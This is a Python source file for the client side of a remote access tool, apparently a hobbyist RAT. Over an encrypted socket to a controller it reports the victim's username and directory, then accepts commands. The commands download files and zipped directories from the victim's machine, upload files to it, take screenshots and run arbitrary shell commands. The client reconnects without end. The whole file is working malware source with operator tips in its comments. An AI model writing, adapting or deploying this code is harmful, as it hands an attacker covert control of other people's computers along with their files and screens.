from socket import socket, error
from os import getcwd, chdir, environ, remove
from subprocess import Popen, PIPE
from time import sleep
from shutil import make_archive
from pyautogui import screenshot
from cryptography.fernet import Fernet
key = "jwtU6dABBShoW0T6PGQP7d5mZDZjEUezwrDRmgjXr-g="
cipher_suite = Fernet(key)


# Function used for encrypting response
# Remember that encryption with incresae data size more than half
def encrypt_response(response):
    return cipher_suite.encrypt(response)


# Function used for adding header to data which tells
# that what is length of comming data
# format == [length of data under 10] + encrpted command
# It means you can send 9999999999 bytes or 9.9 GB of data
# For large data you can change size in my case it is 10
# If you change size then don't forget to change this size in server side script
# And also don't forget to change in "recvall()" function
def add_header(data):
    data = encrypt_response(data)
    data = "{:<10}".format(len(data)) + data
    return data


# Function used for receiving all comming data using header
# Please set data_part receiving bytes upto 10 bytes
# so header can completely receive in my case it is "1024" bytes
def recvall(s):
    new_data = True
    data = ""
    while True:
        data_part = s.recv(1024)
        if new_data:
            data_len = int(data_part[:10])
            data_part = data_part[10:]
            new_data = False
        data += data_part
        if len(data) == data_len:
            break
    return cipher_suite.decrypt(data)


def connection():
    username = str(environ.get('USERNAME'))
    s = socket()
    host = "127.0.0.1"
    port = 9099
    s.connect((host, port))
    ##################################################################
    # For sending some information about device
    details = ("Connected to " + username + "'s computer\n" + getcwd())
    details = add_header(details)
    s.send(details)
    ##################################################################
    print("Connected ...")
    while True:
        cmd = recvall(s)
        if cmd[:3] == "cd " and not cmd == "cd":
            try:
                print("Changing Directory to " + cmd)
                chdir(cmd[3:])
                response = ""
                # Please change OSError to WindowsError if you are using Windows OS
            except OSError:
                response = "Directory Not Found"
            response = (response + "\n" + getcwd())
            response = add_header(response)
            s.send(response)
        elif cmd[:9] == "uploaddir":
            cmd, file_data = cmd.split("||=shail=||")
            dir_name = cmd[9:]
            try:
                open((dir_name + "_uploaded.zip"), 'wb').write(file_data)
                response = "Directory has been uploaded ..."
            except IOError:
                response = "Directory Not Found ..."
            response = (response + "\n" + getcwd())
            response = add_header(response)
            s.send(response)
        elif cmd[:6] == "upload":
            data = cmd[6:].split("||=shail=||")
            try:
                with open(data[0], "wb") as f:
                    f.write(data[1])
                response = ("File Has Been Uploaded\n")
            except IOError:
                response = "Directory Not Found ..."
            response = (response + "\n" + getcwd())
            response = add_header(response)
            s.send(response)
        elif cmd[:11] == "downloaddir":
            dir = cmd[11:]
            try:
                archive = make_archive(dir, 'zip', dir)
                response = open(archive, "rb").read()
                remove(archive)
            except WindowsError:
                response = "not found"
            response = (response + "||=shail=||" + getcwd())
            response = add_header(response)
            s.send(response)
        elif cmd[:8] == "download":
            file = cmd[8:]
            try:
                with open(file, "rb") as f:
                    response = f.read()
            except IOError:
                response = "not found"
            response = (response + "||=shail=||" + getcwd())
            response = add_header(response)
            s.send(response)
        elif cmd[:8] == "download":
            file = cmd[8:]
            try:
                with open(file, "rb") as f:
                    response = f.read()
            except IOError:
                response = "not found"
            response = (response + "||=shail=||" + getcwd())
            response = add_header(response)
            s.send(response)
        elif cmd == "screenshot":
            myScreenshot = screenshot()
            path = "shot.png"
            myScreenshot.save(path)
            with open(path, "rb") as f:
                response = f.read()
            response = (response + "||=shail=||" + getcwd())
            response = add_header(response)
            s.send(response)
            remove(path)
        else:
            response = Popen(cmd, shell=True, stdin=PIPE,
                             stdout=PIPE, stderr=PIPE)
            response = (response.stdout.read() +
                        response.stderr.read() + getcwd())
            response = add_header(response)
            s.send(response)


# This is used to start listening for conections again and again if any error occured
x = 0
while True:
    try:
        connection()
    except error:
        x += 1
        print("Retrying ... ({})".format(x))
        sleep(.5)
